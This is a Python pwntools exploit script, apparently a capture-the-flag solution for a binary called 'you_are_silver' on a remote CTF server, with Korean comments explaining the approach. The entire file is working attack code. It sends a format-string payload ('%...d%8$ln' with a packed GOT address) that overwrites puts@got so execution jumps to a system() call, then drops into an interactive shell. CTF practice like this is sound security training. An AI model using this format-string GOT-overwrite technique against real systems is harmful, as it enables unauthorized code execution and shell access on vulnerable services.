from pwn import *

# 처음엔 조건 맞춰줘야하는줄 알았는데,
# 그냥 play_game에서 system() 부분을 실행하면됨.
# printf@got 조작으로 실행

p = remote('ctf.j0n9hyun.xyz',3022)
#p = process('./you_are_silver')
e = ELF('./you_are_silver')
printf_got = e.got['printf']
puts_got = e.got['puts']

shell = 4196176

print('[*] printf@got ', hex(printf_got))

input('attach gdb')

print(p.recvline())	# Please enter your name

payload = b''
payload += b'%4196176d%8$ln  '
payload += p64(puts_got)

p.sendline(payload)
time.sleep(1)
print(p.recv())
p.interactive()
